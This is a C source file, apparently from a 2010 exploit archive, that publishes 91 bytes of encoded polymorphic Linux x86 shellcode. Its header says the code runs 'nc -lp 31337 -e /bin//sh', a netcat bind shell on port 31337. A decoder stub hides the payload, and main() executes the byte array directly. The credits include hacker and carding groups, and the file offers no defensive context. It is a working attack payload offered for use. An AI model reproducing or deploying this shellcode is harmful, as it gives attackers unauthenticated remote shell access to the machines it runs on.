/*
Title  : nc -lp 31337 -e /bin//sh polymorphic linux shellcode .
Name   : 91 bytes nc -lp 31337 -e /bin//sh polymorphic linux shellcode .
Date   : Mon Jul  5 16:58:50 WIT 2010
Author : gunslinger_ <yudha.gunslinger[at]gmail.com>
Web    : http://devilzc0de.org
blog   : http://gunslingerc0de.wordpress.com
tested on : linux debian
special thanks to : r0073r (inj3ct0r.com), d3hydr8 (darkc0de.com), ty miller (projectshellcode.com), jonathan salwan(shell-storm.org), mywisdom (devilzc0de.org), loneferret (offensive-security.com)
greetzz to all devilzc0de, jasakom, yogyacarderlink, serverisdown, indonesianhacker and all my friend !!
*/

#include <stdio.h>

char shellcode[] = "\xeb\x11\x5e\x31\xc9\xb1\x43\x80\x6c\x0e\xff\x35\x80\xe9\x01"
		   "\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x95\x66\xf5\x66\x07\xe5"
		   "\x40\x87\x9d\xa3\x64\xa8\x9d\x9d\x64\x64\x97\x9e\xbe\x18\x87"
		   "\x9d\x62\x98\x98\x98\xbe\x16\x87\x20\x3c\x86\x88\xbe\x16\x02"
		   "\xb5\x96\x1d\x29\x34\x34\x34\xa3\x98\x55\x62\xa1\xa5\x55\x68"
		   "\x66\x68\x68\x6c\x55\x62\x9a\x55\x64\x97\x9e\xa3\x64\x64\xa8"
		   "\x9d";

int main(void)
{
	fprintf(stdout,"Length: %d\n",strlen(shellcode));
	(*(void(*)()) shellcode)();
}